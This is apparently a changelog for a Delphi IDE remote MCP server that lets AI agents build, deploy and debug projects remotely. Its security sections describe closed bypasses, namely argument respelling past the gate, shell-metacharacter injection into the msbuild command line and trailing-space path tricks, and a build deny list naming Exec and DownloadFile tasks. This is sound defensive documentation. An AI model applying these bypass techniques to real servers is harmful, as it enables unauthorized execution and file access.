### Changed
- **Library read zone widened to component install roots**: the IDE
  registers a component's `Source\` (or per-platform `Lib\`), and next
  to it live `Library\`, `Redist\`, `Examples\` - the native runtime
  libraries a deployment must ship. One level above each registered
  folder is readable now (never a drive root). Measured: OBR's
  `Library\Linux64\libzbar.so` was unreadable before.
- **After a server update, live MCP sessions must reconnect** (field
  agent's report): clients cache `tools/list` at connect time, so a
  parameter added by the update is invisible to a session opened before
  it - the tool refuses with "Falta path" while the agent cannot send
  it. The refusals for the new parameters now say so; the operator's
  deploy ritual includes telling the agents to reconnect.


## [0.40.0-beta] - 2026-08-22

Born from the first "fat" project the field agent built for Linux: a real
FMX app (41 units, FireDAC, REST, third-party components) compiled for
Linux64 except for ONE unit per library - the components' folders were
registered in the IDE's library path for Windows/Android only, and a
platform added to a project inherits no search path from the others. No
tool could add one; the agent reported the wall and proposed exactly
this.

### Added
- **`delphi_config add-searchpath` / `remove-searchpath`**: the IDE's
  Project Options > Search path, per platform (or for every platform with
  `platform` empty). A curated edit of the `.dproj` that creates the
  platform's property groups exactly as the IDE lays them out (definer +
  values group) when they are missing, writes `DCC_UnitSearchPath` (the
  real, SINGULAR property name - measured: the plural is silently
  ignored by the targets), keeps the `$(DCC_UnitSearchPath)` chain, and
  backs the file up first. Paths are vetted like any read: macros
  expanded with the IDE's environment table, resolved from the project
  folder, inside the workspace or the read-only library zone, and
  existing. `view` now lists the search paths per platform group.
  Measured: the 41-unit app built and linked for Linux64 in 12 s after
  four calls (OBR for FireMonkey from source; TeeGrid Sources/FMX/Linux).

### Changed
- A read refused outside the jail now says that the library zone exists
  and what it covers (the folders the IDE registers and their subfolders,
  not their parents) - an agent listed a component's parent folder, got
  the plain jail refusal, and concluded list and read disagreed.


## [0.39.0-beta] - 2026-08-21

Born in the field: the Linux agent had to pull the 72 MB PAServer
installer with `delphi_fetch` - nine 11 MB base64 chunks, ~24M tokens
against a 262K context - and only survived by abusing a client-side
quirk. Bytes belong to HTTP, not to a model's context window.

### Added
- **`GET /files?path=srvd:\...` - direct download route** on the SAME
  HTTP host that serves `/mcp`: same port, same Bearer gate (both tokens -
  downloading is reading; `AnonymousReadOnly` applies), same read jail
  as `delphi_read`/`delphi_fetch` (workspace roots + read-only library
  zone). Streams the file with `Content-Disposition` and an
  **`X-File-SHA256`** header to verify with `sha256sum`. Directories,
  files outside the jail and unserved virtual units are refused by name
  (403) without touching disk; relative paths 400; other methods 405.
  Still "MCP only": one exe, no SMB, no SSH, no side door. Measured: the
  72 MB installer in 0.8 s with matching hashes.
- `delphi_fetch` hands out the link: every answer carries **`download`**
  (relative `/files?path=...`, the path URL-encoded in its virtual form)
  and `downloadNote` (the exact `curl`). **Files over 4 MB answer with
  the link only** - size, sha256, no chunk - unless the client opts into
  inline chunks explicitly with `maxbytes<=1048576` (a client without a
  shell). No new parameter to learn: the one that exists is the switch.
  In stdio mode (no HTTP host) nothing changes.

### Changed
- **Renamed to "Delphi IDE Remote MCP Server"** (repo slug
  `delphi-ide-remote-mcp`, previously `delphi-remote-mcp`): the name now
  says WHAT is being remote-controlled - the Delphi IDE's toolchain
  (RAD Studio: language server, MSBuild, GetIt packages, the SDK's adb),
  not the Delphi language in the abstract. GitHub redirects the old URL.

## [0.38.1-beta] - 2026-08-21

### Fixed
- **"Invalid pointer operation" on every shutdown** (operator field report;
  present for many versions, all three host modes): `TMCPManagerRegistry`
  is a reference-counted `TInterfacedObject`, and the HTTP server / stdio
  transport hold it as `IMCPManagerRegistry` - so freeing the server
  released the last reference and the registry destroyed ITSELF, after
  which `TMcpHost.Destroy`'s manual `FRegistry.Free` freed dead memory.
  The host now pins its own counted reference and lets reference counting
  own the registry. Measured A/B over stdio EOF teardown: pre-fix exit
  code 1, post-fix exit code 0.

## [0.38.0-beta] - 2026-08-21

Born from a hands-on sweep of the IDE's own `bin\` folder (operator's
lead): measuring `convert.exe` revealed that the REAL on-disk binary
`.dfm`/`.fmx` is not what our guard was looking for.

### Added
- **`delphi_components`** (29th tool, read level): the GENERAL answer to
  "what does this server have installed to program with" - every design
  package REGISTERED in the IDE (registry Known Packages + x64 + HKLM,
  the same list RAD Studio loads into its palette), whatever the install
  channel: GetIt, a vendor installer or manual. A GetIt-only listing
  (the first draft of this tool) misses everything installed outside
  GetIt; this one cannot. Description + `.bpl` per line, disabled
  packages marked, IDE-plumbing packages excluded, optional substring
  `filter`. A registry read - no process is even spawned. **No install
  by design** (operator decision): installing packages mutates the whole
  IDE and stays a human decision; a missing library is reported with
  `delphi_report`.

### Fixed
- **Binary designer detection was incomplete**: `delphi_edit` recognized
  only a raw `TPF0` stream at offset 0, but the real binary form written
  by the IDE (and `convert.exe`, measured byte by byte) wraps that stream
  in a 16-bit resource header starting with `$FF` - such a file passed
  the check and would have been treated as text. Designer files whose
  first byte is `$FF` are now refused as binary too (a text form always
  begins with object/inherited/inline, never `$FF`).

## [0.37.0-beta] - 2026-08-21

Born from an operator observation on the live tray: sixteen minutes of
request lines landed in the log window in ONE burst, all stamped with the
drain time - the old path queued one `TThread.Queue` closure per log line
with no cap, growing unbounded whenever the main thread failed to drain,
and nothing was ever persisted (that morning's post-mortem depended on the
operator copy-pasting the window by hand).

### Added
- **Persistent tray log with bounded memory** (`[Log]` in settings.ini):
  the live window stays as it was, but every `LinesPerFile` lines
  (default 2000) the block is saved to `logs\yyyymmdd-hhnnss.log` next to
  the exe and the memo restarts at zero. Rotation keeps the newest
  `MaxFiles` files (default 10). A controlled exit - tray menu or Windows
  logoff/shutdown - flushes the partial block too: the tail of a session
  is exactly what a post-mortem needs most.

### Changed
- Log producer rebuilt: any thread appends straight into a bounded buffer
  (5000 lines, drop-and-count beyond) under a critical section; a 500 ms
  timer drains it to the window on the main thread. Timestamps are taken
  when the line is PRODUCED, so the log tells when things happened, not
  when the window got to paint them.

### Fixed
- **`delphi_adb logcat` false "device lost" on big dumps** (field agent's
  report, reproduced 1:1 against the live device): the device-gone marker
  scan (v0.34.1) ran over the DUMP CONTENT - and a 5000-line Android
  system log naturally contains "failed to connect"/"offline" noise, so
  the scan false-positived and exited with the RAW dump inline (611KB),
  bypassing `filter`, the `out=` file and the 400-line cap in one move.
  The scan now runs only when adb itself exits nonzero; a device gone
  BEFORE the call was already answered by the `get-state` precheck.

## [0.36.0-beta] - 2026-08-21

Born from the field agent's first Phase-3 bug report: it hand-edited a
`.fmx` with VCL-isms, the build packaged it without a word (the compiler
only checks a form resource's TEXT GRAMMAR, never its semantics), and the
app died at form-load on the device - "exited cleanly", no stack trace,
hours of blind debugging.

### Added
- **Designer lint in `delphi_edit`** for text `.fmx`/`.dfm` - and no
  hand-written error rules (the operator's bar: "sin hardcodear"): every
  property line of the resulting file is resolved against **tables
  generated from the framework's own metadata**. Two offline dumpers
  (`tools\designer-meta-dump`, our release tools - the server never runs
  them) walk every linked TPersistent class with `{$STRONGLINKTYPES ON}`
  and classic published typinfo (`GetPropList` - the SAME metadata
  `TReader` streams against; `System.Rtti` hides properties under
  restricted `$RTTI`, measured), emitting classes, published properties
  (inheritance resolved), enum members and set elements into generated
  units (`Lsp.DesignerMeta.Fmx/Vcl.pas`, ~22k facts / 850+ classes,
  regenerate after a RAD upgrade). A second pass INSTANTIATES each
  component - allowed in the offline tool, never server-side - to record
  the class every class-typed property REALLY holds (`TLabel.TextSettings`
  declares `TTextSettings`, public-only; it holds `TLabelTextSettings`,
  which re-publishes - measured), because that is what the streaming
  resolves against.
- The resulting warnings speak the framework's own words: `Size.X` →
  *"X" no existe en TControlSize (publica: Width, Height,
  PlatformDefault)*; `taCenter` → *no es un valor de TTextAlign; validos:
  Center, Leading, Trailing*. Silence policy: unknown classes
  (third-party, user forms), classes without table data, collection
  items, binary blocks and list values are never judged - a lint false
  positive would poison trust. Warnings in the edit audit, not refusals;
  the build still cannot catch these (it only checks a form resource's
  text grammar) and at runtime the app dies at form load - on Android,
  silently (the Fase 3 field lesson that started this).

10 batteries / 572 checks / 0 failures.

## [0.35.0-beta] - 2026-08-21

Field lesson from the first small-model Android run: the server must
protect the CLIENT's context window, not just its own machine. The field
agent (a local 27B) drowned its 200k-token session by pulling a
2,400-line logcat inline - 312k tokens, four compressions, 13-minute
calls.

### Added
- **`delphi_adb logcat out=<file.txt|.log>`** - the dump goes to a file
  on the server (jailed, parents created, UTF-8) and the answer is a
  small JSON (`logfile`, `lines`, `size`) pointing the agent at
  `delphi_read` (which pages at 400 lines per call) and `delphi_search` -
  the same read-in-ranges pattern as `screenshot`+`delphi_fetch`.

### Changed
- **Inline logcat answers are capped at the newest 400 lines**, with an
  honest heading saying how many were captured and how to get the full
  dump (`out=` or a tighter `filter`). A small-context client can no
  longer sink itself with one call.

## [0.34.2-beta] - 2026-08-21

### Fixed
- **Malformed `arguments` no longer crashes the binder.** A `tools/call`
  with `arguments` absent, as an array (`[]`) or as a string reached
  `Tool.Execute` as nil and the parameter binder dereferenced it - an
  access violation on ANY tool (found via the production tray log: a
  client-side serialization slip sent `"arguments":[]`, and the AV
  reproduced deterministically). The MCP spec marks `arguments` optional:
  it is now normalized to `{}` at the single choke point (vendor
  `[local change]`, `TMCPToolsManager.ExecuteTool`), so parameter
  defaults apply. Regression in the HTTP battery: array, absent and
  string forms must answer without an AV.
- **`logcat lines=0` means the default** (300), not a range rejection -
  measured in the field: clients that type every parameter (hermes')
  send `0` for "unset".

10 batteries / 567 checks / 0 failures.

## [0.34.1-beta] - 2026-08-21

### Fixed
- **`delphi_adb` says so when the device is gone** (field, minutes after
  0.34.0: the EDA51's wifi adb dropped itself after idle). Every
  device-addressing command now recognizes adb's device-loss messages
  ("not found", "offline", "failed to connect"...) and appends the recovery
  path: retry `connect` to the SAME ip:port first (many devices keep the
  port - the EDA51 does, measured), else re-enable wireless debugging on
  the device and `discover` the new port (Android 11+ randomizes it). A
  lost device can no longer masquerade as an empty logcat - and since
  `logcat` on a missing device WAITS instead of erroring (measured:
  "- waiting for device -" until the timeout), it now pre-checks
  `get-state` and answers the absence instantly. Battery grows to 58
  checks; 10 batteries / 564 / 0.

## [0.34.0-beta] - 2026-08-21

The deploy half of the remote-target chain, closing the doctrine of the
whole feature: **the deploy target is always a parameter** - a PAServer
profile, an Android device hanging off the server - never implicitly the
agent's machine. The agent programs from anywhere; the devices live here.

### Added
- **`delphi_build target=Deploy`** with the `profile` parameter: compiles
  and deploys to the PAServer of a connection profile (Linux/macOS).
  `Deploy` always runs as `Build;Deploy` - a bare `/t:Deploy` re-ships the
  *previous* binary with today's date (the measured half-a-session trap).
  When the project has no `.deployproj`, a minimal one (the project output,
  exec bit on) is generated in the IDE's own format and the `.dproj` gains
  the import line the IDE writes - without that import msbuild fails
  MSB4057 with the manifest sitting right there (measured). An IDE-written
  manifest is always used as-is. Field-proven: Linux64 deploy to a live
  remote PAServer, binary landing in its scratch dir with the exec bit.
- **Android deploy without opening the IDE** - the apk chain from the
  command line, measured piece by piece against Embarcadero's own
  deployment targets: for `platform=Android*`, `target=Deploy` generates
  the complete staging-map `.deployproj` (the generated AndroidManifest and
  res XML, the default artwork, the libnative stubs, the compiled library -
  the same list the IDE's Deployment Manager writes), seeds
  `AndroidManifest.template.xml` from the product's ObjRepos, and adds
  fallback version properties (package `com.embarcadero.<project>`,
  minSdk 23) and the pre-dexed system-jar list (`EnabledSysJars`,
  enumerated from the product's `lib\android` - measured 88-of-88 identical
  to an IDE-written project; without it the apk assembles WITHOUT
  `classes.dex` and the device refuses it with "code is missing") to the
  `.dproj` - every property conditioned on being empty so anything the IDE
  ever writes wins, and existing files are never touched.
  The apk assembly itself (manifest merge, aapt2, dex, packaging, debug
  signing) is Embarcadero's own pipeline - nothing reinvented. On success
  the result declares the `.apk` as `output` with the install note.
- **`delphi_build` parameter `deviceid`** (`/p:DeviceId=`) - measured: the
  deployment targets only auto-install on iOS (`_InstallIpa`); an Android
  install is `delphi_adb`'s job with the built `.apk`.
- **New tool `delphi_adb`** (28 tools now) - the Android side of the
  doctrine: the devices hang off the SERVER machine while the agent
  programs from anywhere. `discover` (devices announcing wireless
  debugging on the server's network via mDNS, each with its `ip:port` - or
  the developer reads it off the device screen and hands it over),
  `devices` (adb's attached list - the IDE's deploy targets), `connect` /
  `disconnect` (attach over the network; the device asks to authorize the
  first time), `install` (a built `.apk`, path jailed), `run` (launch the
  installed app - the IDE's "Deploy and Run": `am start` on the FMX native
  activity, executing on the DEVICE, sandboxed by Android - `AllowRun`
  governs the server machine, not this), `logcat` (bounded dump `-d -t N`,
  optional in-server filter - remote debugging of the deployed app),
  `screenshot` (the device screen to a PNG on the server, downloaded with
  `delphi_fetch` - the agent's remote EYES; a direct `exec-out` redirect
  mangles the binary through the console, measured, so it captures on the
  device and pulls), `tap` (touch the screen at x,y measured on a
  screenshot) and `key` (a whitelisted navigation key -
  back/home/enter/appswitch/wakeup/arrows/tab, no free keycodes, no text
  injection - the remote HANDS). The adb binary is the IDE's own Android
  SDK's (`SDKAdbPath` in the `.sdk` files), discovered per install, never
  hardcoded. `discover`/`devices`/`logcat`/`screenshot` are read-level
  (looking changes nothing); `connect`/`disconnect`/`install`/`run`/
  `tap`/`key` are write-level (they mutate or execute). **Field-proven end
  to end on a real device**: an FMX app created entirely by tools
  (scaffold + exit button wired into `.pas` and `.fmx`), built, installed,
  launched, SEEN (screenshot with the app on screen), operated (tap on its
  own button) and exited (launcher on the next screenshot) on a Honeywell
  EDA51 over wifi adb - no IDE anywhere in the loop.
- Gate: one identifier rule (`BadDeviceToken`, charset of what adb itself
  prints) shared by `delphi_adb` `address`/`device` and `delphi_build`
  `deviceid`; `Deploy` joins the build target whitelist; build `profile`
  vetted by the same single rule as PAServer profile names; tap coordinates
  digits-only; the key name whitelisted in the tool and charset-vetted at
  the gate.
- **`[Adb] AllowedDevices` allowlist** (settings.ini, or
  `DELPHI_MCP_ADB_DEVICES`): when configured, the ONLY devices this server
  will address - outside the list, nothing, at BOTH access levels. An IP
  entry covers whatever port wifi debugging negotiates; a USB serial is
  listed as-is. With the list active every device-addressing command must
  name its `device` explicitly (an implicit target could be an unlisted
  device that happens to be the only one attached). Absent = unrestricted.
- New battery `tests/test_deploy_adb.py` (57 checks). **10 batteries,
  563 checks, 0 failures.**

## [0.33.0-beta] - 2026-08-21

The last link of the remote-target chain, built and field-proven the same
night: the SDK/sysroot pull. With it, the full cycle ran for the first time -
an agent's PAServer on Linux, its connection profile, the sysroot pulled to
the Windows side, and the very project that died at link the day before
producing a valid Linux64 ELF.

### Added
- **`delphi_paserver command=get-sdk`** - the last link of the remote-target
  chain: pulls the platform SDK/sysroot (the libraries the linker needs)
  from the live PAServer of a connection profile and registers it, so
  `delphi_build` links for that platform. Measured end to end against a real
  target the day it was built: 1,678 files / 1.9 GB pulled, GCC version
  auto-detected from the tree, `Linux64.sdk` written fully resolved (the
  IDE's own format - no MSBuild macros), and the very project whose build
  died at link (`cannot find -lgcc_s`) produced a valid ELF on the next try.
  C++ headers are deliberately not pulled (this server links Delphi);
  distro-layout differences (Ubuntu vs RedHat vs merged /lib) are optional
  pulls that skip when absent. Linux64 today; other platforms report their
  absence honestly.
- **`delphi_build` passes the SDK automatically**: for a remote platform,
  when `<Platform>.sdk` exists (written by get-sdk) it goes to msbuild as
  `/p:PlatformSDK=...` - EnvOptions.proj has no default for platforms the
  IDE's SDK Manager never configured. No behaviour change for Win/Android.
- Measured for the .sdk generator (the piece the docs do not tell): the
  Delphi Linux64 targets read `$(Profile_LibraryPath)` - a PROPERTY resolved
  at project-load - not the `ProfileLibrary` ITEMS (those feed a build-time
  target on the C++ side). An .sdk without that property imports cleanly,
  collapses paths in the debug target, and still fails the link.
- **`delphi_report` grows an `agent` id**: pass a short stable id (e.g.
  "hermes") and your reports land in their own subfolder under `reports/`,
  separate from other agents on the same server. The value is slugged by the
  server before touching the filesystem (the client still never supplies a
  path); without it, reports stay in the root folder as before. Also the
  seed of a wider per-client identity later.

### Changed
- The Linux install hint of `delphi_paserver command=packages` now carries
  two field-measured warnings from the first real remote PAServer install:
  a headless `paserver` whose stdin hits EOF spins its prompt at ~100% CPU
  (keep stdin open: `sleep infinity | ./paserver ...`), and `-passfile` with
  a plain-text password was rejected on login while `-password=<pwd>` inline
  authenticated - prefer the latter for ad-hoc runs.

## [0.32.0-beta] - 2026-08-21

The network half of PAServer, built the day the first live PAServer existed to
test it against: a field agent installed PAServer on its Linux machine using
only this server's tools (locate installer, chunked fetch with sha256, run),
then reported - through `delphi_report` - that no tool could register the
connection profile on the Windows side. This release closes exactly that gap.

### Added
- **`delphi_paserver command=add-profile`** - registers a connection profile
  against a live PAServer (`name`, `host`, `password`; optional `port` default
  64211, `platform` default Linux64). The profile file is written by RAD
  Studio's own `paclient.exe --local`, so the on-disk format - password
  encrypted included - is always the IDE's, never invented. `--passfile` was
  measured and rejected: it stores the passfile PATH in the profile, leaving
  the password in plain text on disk forever.
- **`delphi_paserver command=test-connection`** - two forms. With `name`: the
  full PAServer handshake (connect + authenticate) through that profile, exit
  code and paclient output included. With `host`+`port` and NO name: a raw
  TCP reachability probe with elapsed time - the quick "does this server
  reach my PAServer at all?" answer an agent needs before chasing
  credentials, requested from the field (the agent behind NAT had no way to
  ask whether the server could reach it).
- **Secret masking in the transport logs.** The HTTP and stdio transports log
  each raw request body before the tool gate runs, so the PAServer password
  in `add-profile` arguments would have landed in the server log. A masker in
  the vendored logger (`MaskSecretValues`, `[local change]`) now blanks the
  values of `password`/`passkey`/`passfile`/`token` keys in every logged
  request line. Verified by the new battery: the password never appears in
  the log, the masked request does.
- New E2E battery `tests/test_paserver.py` (29 checks): the three read
  commands, gate vetting of every argument, a real profile written and
  encrypted, both test-connection forms, read-only refusals, log masking,
  cleanup. Total across batteries: 498 checks.

### Fixed
- **Tray mode: minimize now goes to the tray.** With `MainFormOnTaskbar` off,
  a VCL minimize targets the hidden application window - the log window
  neither minimized nor returned to the tray. Minimize is now intercepted
  (`SC_MINIMIZE`) and hides the window, matching the close button's
  close-to-tray behaviour.

### Security
- `add-profile`/`test-connection` are write-gated: read-only credentials keep
  the three listing commands only. All five arguments are vetted at the
  single gate (`PAServerArgDenied`): profile name doubles as a file name
  (strict charset, max 64), host/port/platform whitelisted, password may not
  carry quotes or control characters. The platform list is paclient's own
  (`PACLIENT_PLATFORMS`), narrower than the .dproj whitelist.

### Changed
- **Renamed to "Delphi Remote MCP Server"** (repo slug `delphi-remote-mcp`). The
  old "DelphiLSP" name implied a language-server bridge; this is an MCP server to
  control Delphi remotely, and DelphiLSP backs only 7 of the 27 tools. GitHub
  keeps the old URL redirecting. The README now lists, by name, exactly which 7
  tools use DelphiLSP and which 20 do not.
- Deliberately **unchanged** (to not break configured clients): the MCP
  `serverInfo.name` (`delphi-lsp-mcp-service`), the Windows service name and the
  executable name (`DelphiLspMcp.exe`). Those are identifiers, not branding.

## [0.31.0-beta] - 2026-08-20

It can finally run the way a server is supposed to run: as a Windows Service,
started by the machine, with no one logged in. Getting there meant collapsing
the two projects into one, which was overdue for its own reasons - two projects
meant two `uses` clauses to keep in sync by hand, and a tool unit added to one
and forgotten in the other silently gave that host fewer tools.

### Added
- **Windows Service mode.** `DelphiLspMcp.exe -install` (elevated) registers it,
  `-uninstall` removes it, and the SCM starts it like any service. The install
  bakes the mode switch into the registered `ImagePath`, because running with
  no arguments is the terminal mode - without that the SCM would launch a
  console that never answers it. Verified end to end: install, start, serve MCP,
  a real tool call, stop, uninstall.
- **One executable, three modes.** No switch = terminal (stdio, or `--http` for
  the remote mode); `-service` = Windows Service; `-gui` = the tray app. Each
  spelling is accepted as `/x`, `-x` or `--x`.

### Changed
- **The two projects are now one.** `DelphiLspMcpTray.dproj` is gone: the tray
  is a mode of the single project. A host can no longer expose fewer tools than
  another, because there is only one unit list.
- **`Lsp.Host` builds the server for every mode.** The manager registry, the
  single access gate, its outbound filter and the vault declaration were
  written out inline in the console host AND again in the tray - a policy added
  to one copy and forgotten in the other is a hole that exists on one host
  only. Built once now; the service was never going to be a third copy.
- The startup facts an operator needs (the write jail, the vault, the
  credential situation) come from one place and are reported by all three
  modes, instead of each host deciding for itself what was worth saying.

### Fixed
- **The tray had no icon at all** - not even a stock one. `TTrayIcon` had
  `Visible=True` with nothing assigned, the repo shipped no `.ico`, and neither
  project declared an application icon, so the notification area showed a blank
  slot. Two original icons now ship (running and stopped), the project declares
  one, and the tray assigns it.

### Documentation
- The README leads with what this is - an MCP server to control Delphi
  remotely, so you can develop from any platform - instead of implying a
  language-server bridge, and adds a table of **what each tool actually runs
  on**: 7 of the 27 tools are backed by DelphiLSP, the other 20 are MSBuild,
  git, the safe editing engine, the filesystem and the vault.
- `ARCHITECTURE.md`, `ROADMAP.md` and `firewall-allow.ps1` brought in line with
  the merge: they still described two hosts and matched a tray exe that no
  longer exists.

### Tests
- **The batteries no longer trigger a Windows Firewall prompt on every run.**
  It was never the server: `test_http_auth` copied the exe into a fresh random
  temp folder each run and let it listen on all interfaces, and the firewall
  decides per program path - so every run looked like a new program and asked
  again, leaving a dead rule behind (forty had piled up). The tests bind
  loopback now, where they already connect.
- **One scratch folder with fixed names**, `%TEMP%\delphi-mcp-tests\<battery>`,
  instead of eleven differently-named ones (several with the pid in the name).
  A stable path is also what stops the firewall prompt above. The cleanup now
  clears the read-only bit git leaves under `.git\objects` and asserts the
  folder is really gone - a cleanup that fails silently had been skipping three
  clone/pull checks with no failure to show for it.

## [0.30.0-beta] - 2026-08-20

A security release. The field audit that opened round 10 reported one real
issue; auditing our own answer to it turned up four more, three of them worse
than the original. Every one belongs to the same family: **two pieces of the
server disagreeing about what a request says**. The gate read an argument name
one way and the binder another; a drive letter counted as "served" on the way
out but not on the way in; a value was a number to the client and a shell
fragment to `cmd.exe`. Where two readings existed, there is now one.

### Security
- **The entry gate now reads arguments exactly as the binder resolves them.**
  It used `TJSONObject.TryGetValue` (case-sensitive) while the RTTI binder
  normalizes case and `_`, so a parameter spelled `Args` or `Com_mand` was
  invisible to the gate and fully visible to the tool: every decision the gate
  makes - read-only status, git option whitelist - could be walked past by
  respelling. One shared rule now (`TMCPSerializer.NormalizeKey`, exposed as a
  marked local change), read through a single `ArgStr` helper.
- **Duplicate parameter names are refused.** Two keys that normalize to the
  same name let the gate vet one value while the binder passed the tool the
  other. No client emits duplicates; the ambiguity is refused rather than
  resolved by guessing.
- **`delphi_build` validates `platform`, `config` and `target`.** They reached
  an unquoted `cmd.exe` line (`rsvars.bat && msbuild ...`), so a metacharacter
  was arbitrary execution - past `AllowRun`, the workspace jail, the
  low-integrity sandbox and the `.dproj` hazard scanner at once, defeating the
  server's central promise that it compiles and never runs. `platform` reuses
  the whitelist that already existed for the `.dproj` XML sink; `target` is a
  fixed trio; `config` stays open to project-defined names but admits no shell
  metacharacter.
- **A workspace root can no longer be deleted or moved.** `delphi_delete` and
  `delphi_move` park their target in a trash folder created next to it - for a
  root that lands in the root's *parent*, a write outside the jail, taking the
  whole workspace with it. Refused for every credential.
- **An exception escaping a tool no longer bypasses drive masking.** The
  dispatcher wraps any exception as `Error executing tool: <message>`, and a
  Delphi I/O exception embeds the real absolute path. The three byte-fidelity
  exemptions (`delphi_read`, `vault_read`, `vault_search`) only cancelled on a
  lower-case `error`, so that wrapper travelled unmasked. Matched by exact
  token, case-sensitively: a loose test would mask real file content and break
  anchored writes.
- **An unserved virtual unit never reaches the filesystem.** `srvz:\x` was
  expanded to the real `Z:\x` and echoed in the rejection, so probing
  `srva:`..`srvz:` enumerated the host's drives. Only served letters expand
  now; anything else is refused by name, listing the units that do work.
- **The knowledge vault is a served root of its own.** Its drive joins the
  served set alongside the workspace roots and the library zone; a vault on
  another letter used to leak that letter unmasked and its `srvX:` form did not
  resolve inbound.

### Changed
- **A wrong argument value is an error, not a silent default.** A string that
  is not a number became `0` and any boolean but `true` became `False`, so an
  agent believed it had filtered when it had not - a plausible wrong answer,
  the worst failure for a client that cannot see the server. Unreadable values
  now name the parameter and what was expected. Values that parse cleanly are
  still accepted whatever their JSON type (`"5"`, `"TRUE"`), so lenient clients
  keep working.
- **JSON `null` means "not provided".** It used to reach the binder's string
  path, where `TJSONAncestor.Value` yields the literal `'null'`: a null number
  became `0` and a null string became the four characters `null`.
- **`delphi_report` is bounded** (256 KB per report, counted over message,
  title and from). It is the only write a read-only - even anonymous -
  credential may perform, so it was also the only way such a client could grow
  the server's disk. A folder quota with a retention policy is roadmap.
- The virtual-unit shape is recognized in exactly one place
  (`VirtualUnitLetter`), used by both the inbound expansion and the rejection.

### Documentation
- `settings.example.ini` documents `AllowBuildScripts`, which existed and was
  described in the README but was missing from the template.

### Tests
- 468 checks across 8 batteries (was 423), every new fix paired with the vector
  it closes *and* with a counter-test that proves it did not over-tighten: a
  project-defined configuration name with a space still builds, content that
  merely starts with "Error" is still returned verbatim, numeric strings still
  bind, and deleting a file inside a root still works.

## [0.29.0-beta] - 2026-08-20

Field lesson from the first remote deploy (OpenCode agent bringing a freshly
built exe to its own machine): the build succeeded in seconds, then the agent
spent ~20 calls hunting the exe, because `delphi_list` hid the build-output
folders it had every reason to look in. A stateless protocol means the agent
only knows what each result tells it - so results must leave it ready for the
next step, the same way a rejection offers the legitimate path.

### Changed
- **`delphi_list` filters IDE artifacts RELATIVE to the requested root.**
  Naming a build-output folder (`Compiled\Win32\Release`...) as `root` is
  explicit consent to see inside it: its files and subdirectories are now
  listed. Listings from above still hide build output, but the result now
  carries `hidden` (how many entries the artifact filter removed) and a
  `note` telling the agent how to see them - before, the folder simply
  answered empty while `delphi_fetch` served the same path, and the
  contradiction cost the field agent four minutes of blind guessing.
- **`delphi_build` declares the artifact it produced.** On success the result
  now carries `output` (the built .exe/.dll/.bpl, resolved from the .dproj's
  `DCC_ExeOutput`/`DCC_BplOutput` or the IDE default and verified ON DISK),
  `outputSize`, and an `outputNote` pointing at `delphi_package` +
  `delphi_fetch` for retrieval.
- **The tray host announces its version** in the startup log line, the window
  caption and the tray icon hint (before, no way to tell WHICH build was
  serving without calling `initialize`).

### Docs
- `docs/CLIENTS.md`: how to receive `delphi_fetch` chunks through OpenCode,
  whose client truncates oversized tool output to a local spool file - the
  spool IS the transport (one-line PowerShell decode included), plus the
  recommended `build` -> `package` -> `fetch` flow for binaries.

8 E2E batteries, **423 checks** (new: relative artifact filtering with
`hidden`+`note`, explicit root inside build output, `delphi_build`
`output`/`outputSize`/`outputNote`).

## [0.28.0-beta] - 2026-08-20

Field round 9, second pass. One confirmed data-loss bug (concurrency) fixed, and
the build hazard scanner narrowed so it stops rejecting legitimate projects - the
tester's "a false positive is as serious as a hole".

### Security
- **CONCURRENT vault writes lost data, silently.** A knowledge vault is shared by
  several remote agents, so two of them appending to the same note at once is
  normal - but the read -> backup -> write cycle of `vault_append`/`vault_patch`
  was not serialized. Both read the same base and the last save erased the
  other's addition, while BOTH callers got an "ANADIDO ... copia previa" success;
  and two backups of one note in the same second collided at the copy step. The
  whole cycle now runs under one process-wide lock (`vault_create` too), so every
  reported success is really on disk. The append and patch write paths were
  unified into a single locked helper so the fix lives in one place.
- **git `clone` now inserts `--` before the URL**, so the URL can never be parsed
  as an option whatever it contains (defence in depth over the existing
  leading-`-` check and the gate's dangerous-flag filter). User options still
  apply - they go before the `--`.

### Changed
- **The build hazard scanner no longer refuses an INERT custom `<Target>`.**
  Rejecting *every* `<Target>`/`<Exec>` was a false positive as serious as a
  hole: it broke real projects with a post-build copy or Authenticode signing.
  The scanner now refuses only tasks that **execute a program or plant/delete
  files** (`Exec`, `UsingTask`, inline `Code`, `Copy`/`Move`/`Delete`/`MakeDir`/
  `WriteLinesToFile`/`WriteCodeFragment`/`DownloadFile`, compilers...). A target
  that only prints a `<Message>` or sets a property now builds.
- **New opt-in `[Security] AllowBuildScripts` (env `DELPHI_MCP_ALLOW_BUILD_SCRIPTS`).**
  A *trusted* project that signs or copies at build time can be enabled WITHOUT
  turning on `delphi_run` (which `AllowRun` would). `AllowRun` still implies it.
  Untrusted uploads with no opt-in still hit the scanner. Both default to off.

8 E2E batteries, **416 checks** (new: R9 concurrency burst over HTTP; scanner
false-positive / opt-in cases).

## [0.27.0-beta] - 2026-08-20

Field round 9 (Fable), first findings - plus the vault bootstrap redesigned to
match how the same vault is read locally.

### Security
- **CRITICAL: the vault's governance files could be written through a trailing
  space.** `vault_append` with `"MEMORY.md "` reached the real file: Windows
  trims the space when opening, while the governance check compared the raw
  string and saw a different name. The check now decides on the **resolved**
  path, and the Windows name rule (segment ending in a dot or space, or
  carrying an ADS) is enforced by **one shared helper** - the same one the
  workspace jail uses, now covering every path segment rather than only the
  last. The same trick had defeated `delphi_textedit` in an earlier round; it
  is now a single rule in a single place instead of one per toolset.
- **`vault_patch` could empty a note** (`old_text` = the whole content,
  `new_text` = `""`). Deleting knowledge is not an operation this server
  offers, so a replacement that would leave the note blank is refused - the
  automatic backup is there for accidents, not as a licence.

### Changed
- **The vault bootstrap serves WHOLE FILES again.** Concatenating rules + index
  into one 85 KB result overflowed a client, and paging it by line meant
  reading documentation in fragments - which is not how the vault is read
  locally. Now each file arrives complete, and when the two do not fit
  together the second is fetched by name (`vault_read {path: "MEMORY.md"}`):
  the split happens between files, never inside one. Measured on a real vault:
  22 KB then 63 KB, two calls, both whole.

### Fixed
- Removed a duplicated implementation of the Low-integrity labelling helper in
  `Lsp.Sandbox` (the same function body under two names).

7 E2E batteries, **401 checks**.

## [0.26.2-beta] - 2026-08-20

### Changed
- **All build output now lands under `Compiled/`** (`Compiled/<Platform>/<Config>`
  for binaries, `Compiled/Dcu/...` for units) instead of scattering
  `Win32/`/`Win64/` folders through the source tree - the layout `delphi_config
  set-output` produces, now applied to this project itself. `Compiled/` added to
  `.gitignore` (binaries and `settings.ini` were already ignored by name).

### Fixed
